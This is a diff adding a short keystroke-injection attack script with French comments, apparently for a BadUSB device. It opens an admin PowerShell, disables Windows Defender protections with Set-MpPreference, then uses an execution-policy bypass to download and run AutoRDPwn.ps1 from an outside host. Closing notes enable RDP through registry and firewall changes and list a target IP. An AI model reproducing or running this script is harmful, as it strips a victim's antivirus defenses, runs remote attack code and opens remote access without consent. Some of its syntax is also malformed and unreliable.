@@ -1,0 +1,28 @@
+layout("fr");
+typingspeed("#.#");
+press("GUI r");
+type("powershell");      // pour lancer powershell en admin
+delay(700);
+press("LEFT");
+press("DOWN");
+press("DOWN");
+press("ENTER");
+delay(3500);
+type(‘Set-MpPreference -DisableIntrusionPreventionSystem $true 
+-DisableIOAVProtection $true -DisableRealtimeMonitoring $true 
+-DisableScriptScanning $true -EnableControlledFolderAccess Disabled 
+-EnableNetworkProtection AuditMode -Force -MAPSReporting Disabled 
+-SubmitSamplesConsent NeverSend’);
+type("New-Item "C:\SharedFolder" -itemType Directory");           // Le dossier sera dans le répertoire C:\ et se nommera "SharedFolder" dans cet exemple
+
+
+Attaque autordpwn:
+type('powershell -ep bypass "cd $env:temp ; iwr https://darkbyte.net/autordpwn.php -outfile AutoRDPwn.ps1 ; .\AutoRDPwn.ps1"');
+
+Autorisation RDP avec powrshell:
+PS > Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server" -Name "fDenyTSConnections" -Value 0
+PS > Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
+PS > Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" -Name "UserAuthentication" -Value 1
+
+
+192.168.252.130
